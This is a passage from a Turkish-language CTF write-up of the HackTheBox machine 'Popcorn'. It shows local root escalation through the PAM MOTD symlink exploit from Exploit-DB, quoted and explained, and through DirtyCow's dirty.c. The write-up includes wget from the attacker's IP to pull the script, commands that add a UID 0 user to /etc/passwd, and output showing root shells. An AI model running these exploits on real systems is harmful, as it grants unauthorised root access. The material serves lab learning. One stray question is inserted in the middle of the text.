![Pasted image 20250206190404.png](/img/user/resimler/Pasted%20image%2020250206190404.png)


Şimdi tekrar SSH ile giriş yapacağım ve ardından `/etc/passwd` dosyasının sahibi `www-data` olacak.

![Pasted image 20250206190551.png](/img/user/resimler/Pasted%20image%2020250206190551.png)


#### Add Root Users

Yazma erişimimle, sadece bir root kullanıcısı ekleyeceğim. İlk olarak, bir şifre hash'ine ihtiyacım var.

![Pasted image 20250206192029.png](/img/user/resimler/Pasted%20image%2020250206192029.png)

Şimdi /etc/passwd dosyasına bir kullanıcı ekleyeceğim:

Kullanıcı `asd123`, şifresi `asd123`'nin hash değeri, kullanıcı ve grup kimlikleri 0 (root için), açıklama "pwned", ana dizin `/root` ve shell `/bin/bash` olacak.

#### Shell
Artık root shell'i almak için cartel'e su gönderebiliyorum:

![Pasted image 20250206192016.png](/img/user/resimler/Pasted%20image%2020250206192016.png)


### Script

#### Analysis

[Exploid-DB script'i](https://www.exploit-db.com/exploits/14339) bir grup fonksiyon tanımlar, bazı temel kontroller yapar ve ardından bunu çalıştırır:

```
KEY="$(mktemp -u)"
key_create || { echo "[-] Failed to setup SSH key"; exit 1; }
backup ~/.cache || { echo "[-] Failed to backup ~/.cache"; bye; }
own /etc/passwd && echo "$P" >> /etc/passwd
own /etc/shadow && echo "$S" >> /etc/shadow
restore ~/.cache || { echo "[-] Failed to restore ~/.cache"; bye; }
key_remove
echo "[+] Success! Use password toor to get root"
su -c "sed -i '/toor:/d' /etc/{passwd,shadow}; chown root: /etc/{passwd,shadow}; \
  chgrp shadow /etc/shadow; nscd -i passwd >/dev/null 2>&1; bash" toor
```

`key_create` bir SSH anahtarı oluşturur ve bunu mevcut kullanıcının ana dizinine kurar, mevcut olanları yedeklemeye dikkat eder.

`backup ~/.cache` bunu yapacaktır - dizinin yedek bir kopyasını oluşturur.

`own` fonksiyonu incelemeye değerdir:

```
own() {
    [ -e ~/.cache ] && rm -rf ~/.cache
    ln -s "$1" ~/.cache || return 1
    echo "[*] spawn ssh"
    ssh -o 'NoHostAuthenticationForLocalhost yes' -i "$KEY" localhost true
    [ -w "$1" ] || { echo "[-] Own $1 failed"; restore ~/.cache; bye; }
    echo "[+] owned: $1"
}
```

Eğer `~/.cache` mevcutsa, önce onu kaldırır. Ardından, hedef dosyaya (öncelikle `/etc/passwd`, ardından `/etc/shadow`) bağlantı oluşturur. Daha sonra, doğru komutu çalıştırmak ve sonra bağlantıyı kesmek için SSH bağlantısı kurar. Son olarak, dosyada yazma izinlerinin olup olmadığını doğrular.

`own` fonksiyonunun her çağrısında yazma erişimi elde eder ve ardından bir satır ekler, böylece root kullanıcı olarak "toor" kullanıcısını ekler, tıpkı manuel olarak yaptığım gibi.

Sonrasında `.cache` dosyasını geri yükler ve eklenen SSH anahtarını temizler.

Son olarak, su -c komutunu, `toor` kullanıcısı olarak root yetkileriyle çalıştıracak şekilde çağırır. Parolayı (`toor`) girdiğimde, aşağıdaki komut çalıştırılır:

- `toor` kullanıcısının `/etc/passwd` ve `/etc/shadow` dosyalarındaki satırını siler;
- Her iki dosyanın sahibini root yapar;
- `/etc/shadow` dosyasının grubunu shadow yapar;
- `nscd`, isim hizmetleri için bir önbellekleme daemon'ıdır ve bu, [önbelleği geçersiz kılar](https://linux.die.net/man/8/nscd);
- Ardından bir shell başlatır.

Temelde, işlem kendini temizler ve sonra bir shell başlatır.

Bu tür otomatik temizlik ve bağlantı manipülasyonu senaryolarında genellikle hangi güvenlik önlemleri öncelikli olmalıdır?



#### Run
Kutuyu sıfırladım, bir webshell'i yeniden yükledim, pty ile bir shell aldım. Sonra Python web sunucusu (python3 -m http.server 80) ve wget kullanarak scripti yükledim:

```
www-data@popcorn:/dev/shm$ wget 10.10.14.14/pam_motd.sh
--2020-06-21 22:28:38--  http://10.10.14.14/pam_motd.sh
Connecting to 10.10.14.14:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3043 (3.0K) [text/x-sh]
Saving to: `pam_motd.sh'

100%[======================================>] 3,043       --.-K/s   in 0.004s  

2020-06-21 22:28:38 (761 KB/s) - `pam_motd.sh' saved [3043/3043]
```

Script çalışır ve bir root shell döndürür:

```
www-data@popcorn:/dev/shm$ bash pam_motd.sh 
[*] Ubuntu PAM MOTD local root
[*] SSH key set up
[*] spawn ssh
[+] owned: /etc/passwd
[*] spawn ssh
[+] owned: /etc/shadow
[*] SSH key removed
[+] Success! Use password toor to get root
Password: 
root@popcorn:/dev/shm#
```

### Dirty Cow

Bu kutunun yaşı göz önüne alındığında, burada hedef alınabilecek birkaç çekirdek açığı kesinlikle vardır. Örneğin, `uname -a` komutu 2.6.31 çalıştığını gösteriyor:

```
root@popcorn:/dev/shm# uname -r 
2.6.31-14-generic-pae
```

Muhtemelen [DirtyCow](https://github.com/dirtycow/dirtycow.github.io/wiki/Patched-Kernel-Versions) açığına karşı savunmasızdır. Bununla ilgili sayfada bir [dizi kanıt-of-concept (POC)](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs) bulunmaktadır. Ben en iyi sonucu `dirty.c` ile aldım. Bu [kodu](https://github.com/FireFart/dirtycow/blob/master/dirty.c) alıp Popcorn üzerinde derleyebilirim:

```
www-data@popcorn:/dev/shm$ gcc -pthread dirty.c -o dirty -lcrypt
```

Now run it:

```
www-data@popcorn:/dev/shm$ chmod +x dirty
www-data@popcorn:/dev/shm$ ./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: 
Complete line:
firefart:fiek5FdMtod.2:0:0:pwned:/root:/bin/bash

mmap: b78a8000
^C
```

Bazı nedenlerden dolayı bazen takılabiliyor. Bir dakika sonra işlemi sonlandıracağım. Ancak, kullanıcı hala ekli kalıyor.

```
www-data@popcorn:/dev/shm$ su - firefart
Password: 
firefart@popcorn:~# id
uid=0(firefart) gid=0(root) groups=0(root)
firefart@popcorn:~#
```

Yani, `firefart` kullanıcısının şifresi **fiek5FdMtod.2** olacaktır.
